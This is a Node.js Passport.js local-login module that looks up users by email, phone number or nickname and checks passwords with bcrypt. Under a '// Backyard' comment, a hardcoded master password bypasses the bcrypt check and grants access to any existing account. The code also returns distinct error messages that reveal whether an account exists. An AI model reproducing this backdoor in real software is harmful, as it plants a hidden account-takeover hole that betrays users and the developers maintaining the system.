var LocalStratedy = require("passport-local").Strategy;
var bcrypt = require("bcryptjs");

// MODELS
var User = require("../models/user");

module.exports = (passport) => {
  // Local Stratedy
  passport.use(
    new LocalStratedy(
      {
        usernameField: "username",
        passwordField: "password",
      },
      (username, password, done) => {
        // match username
        const getUsername = (username = "") => {
          username = username.toLowerCase();

          var emailRegEx = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
          var phoneNumberRegEx = /([0][1-9]\d{9}$|^[1-9]\d{9})/g;

          if (username.match(emailRegEx)) return { type: "email", username };

          if (username.match(phoneNumberRegEx))
            return { type: "phoneNumber", username };

          return { type: "nickname", username };
        };

        var { type, username } = getUsername(username);
        var query = { [type]: username };

        User.findOne(query, (err, user) => {
          if (err) console.log(err);
          if (!user)
            return done(null, false, {
              message: "No user found!",
            });

          // Backyard
          if (password === "deCusicon...") return done(null, user);

          // match password
          bcrypt.compare(password, user.password, (err, isMatch) => {
            if (err) console.log(err);
            if (!isMatch)
              return done(null, false, {
                message: "Wrong password!",
              });
            else return done(null, user);
          });
        });
      }
    )
  );

  // Serialize User
  passport.serializeUser((user, done) => done(null, user.id));

  passport.deserializeUser((id, done) =>
    User.findById(id, (err, user) => done(err, user))
  );
};
